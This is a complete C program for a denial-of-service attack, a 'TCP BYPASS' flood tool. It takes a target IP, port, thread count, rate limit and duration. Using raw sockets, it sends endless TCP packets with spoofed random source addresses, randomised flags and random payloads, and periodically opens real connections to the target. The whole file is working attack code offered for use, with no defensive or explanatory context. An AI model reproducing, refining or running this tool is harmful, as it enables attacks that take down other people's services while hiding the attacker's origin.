#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 662436;
static unsigned int floodPort;
static unsigned int packetsPerSecond;
static unsigned int sleepTime = 100;
static int limiter;

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

uint32_t util_external_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (htonl((9 << 27) | (9 << 18) | (9 << 9) | (9 << 0)));
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

void setup_tcp_header(struct tcphdr *tcpHeader, unsigned int port, int is_fin)
{
    tcpHeader->source = rand_cmwc() & 0xFFFF;
    tcpHeader->dest = htons((rand_cmwc() % 65535) + 1);
    tcpHeader->seq = rand_cmwc() & 0xFFFF;
    tcpHeader->ack_seq = rand_cmwc() & 0xFFFF;
    tcpHeader->res2 = 0;
    tcpHeader->doff = 5;
    tcpHeader->fin = rand_cmwc() % 2;
    tcpHeader->syn = rand_cmwc() % 2;
    tcpHeader->psh = rand_cmwc() % 2;
    tcpHeader->ack = rand_cmwc() % 2;
    tcpHeader->window = rand_cmwc() & 0xFFFF;
    tcpHeader->check = 0;
    tcpHeader->urg_ptr = 0;
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *ipHeader = (struct iphdr *)datagram;
    struct tcphdr *tcpHeader = (void *)ipHeader + sizeof(struct iphdr);
    struct pseudo_header psh;
    char *data;
    int randomLength = rand_cmwc() % (240 - 150 + 1) + 90;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodPort);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
    perror("Socket creation failed");
    pthread_exit(NULL);
    }

    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(datagram, 0, MAX_PACKET_SIZE);
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

    for (int a = 0; a < randomLength; a++)
    {
        *(char *)++data = (char)(rand_cmwc() & 0xFF);
    }

    ipHeader->ihl = 5;
    ipHeader->version = 4;
    ipHeader->tos = 0;
    ipHeader->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength;
    ipHeader->id = htonl(rand_cmwc() & 0xFFFF);
    ipHeader->frag_off = 0;
    ipHeader->ttl = 240;
    ipHeader->protocol = IPPROTO_TCP;
    ipHeader->check = 0;
    ipHeader->saddr = htonl(rand_cmwc());
    ipHeader->daddr = sin.sin_addr.s_addr;

    ipHeader->check = csum((unsigned short *)datagram, ipHeader->tot_len);

    psh.source_address = util_external_addr();
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + randomLength);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + randomLength;
    char pseudogram[psize];
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcpHeader, sizeof(struct tcphdr) + randomLength);
    tcpHeader->check = csum((unsigned short *)pseudogram, psize);

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));
    unsigned int i = 0;
    unsigned int packetCounter = 0;

    while (1)
    {
        if (packetCounter > 1000)
        {
            setup_tcp_header(tcpHeader, floodPort, 1);
            int sockfd, check;
            struct sockaddr_in target;
            sockfd = socket(AF_INET, SOCK_STREAM, 0);
            bzero((char *)&target, sizeof(target));
            target.sin_family = AF_INET;
            target.sin_addr.s_addr = sin.sin_addr.s_addr;
            target.sin_port = htons(floodPort);
            check = connect(sockfd, (struct sockaddr *)&target, sizeof(target));
            packetCounter = 0;
        }
        else
        {
            packetCounter++;
        }

        if (sendto(s, datagram, ipHeader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("Packet send failed");
}

        setup_tcp_header(tcpHeader, floodPort, 0);

        randomLength = rand_cmwc() % (120 - 90 + 1) + 90;
        data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

        for (int a = 0; a < randomLength; a++)
        {
            *(char *)++data = (char)(rand_cmwc() & 0xFF);
        }

        ipHeader->id = htonl(rand_cmwc() & 0xFFFF);
        ipHeader->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength;
        ipHeader->check = csum((unsigned short *)datagram, ipHeader->tot_len);

        psh.dest_address = sin.sin_addr.s_addr;
        psh.tcp_length = htons(sizeof(struct tcphdr) + randomLength);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcpHeader, sizeof(struct tcphdr) + randomLength);
        tcpHeader->check = csum((unsigned short *)pseudogram, psize);

        packetsPerSecond++;
        if (i >= limiter)
        {
            i = 0;
            usleep(9000);
        }
        i++;
    }

    close(s);
    return NULL;
}

int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stderr, "TCP BYPASS\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }

    fprintf(stdout, "Setting up Sockets...\n");

    int numThreads = atoi(argv[3]);
    floodPort = atoi(argv[2]);
    int maxPacketsPerSecond = atoi(argv[4]);
    limiter = 0;
    packetsPerSecond = 0;
    pthread_t thread[numThreads];
    int multiplier = 20;

    for (int i = 0; i < numThreads; i++)
    {
        pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
    }

    fprintf(stdout, "Starting Flood...\n");

    for (int i = 0; i < (atoi(argv[5]) * multiplier); i++)
    {
        usleep((1000 / multiplier) * 1000);
        if ((packetsPerSecond * multiplier) > maxPacketsPerSecond)
        {
            if (1 > limiter)
            {
                sleepTime += 100;
            }
            else
            {
                limiter--;
            }
        }
        else
        {
            limiter++;
            if (sleepTime > 25)
            {
                sleepTime -= 25;
            }
            else
            {
                sleepTime = 0;
            }
        }
        packetsPerSecond = 0;
    }

    for (int i = 0; i < numThreads; i++)
    {
        pthread_cancel(thread[i]);
    }

    return 0;
}
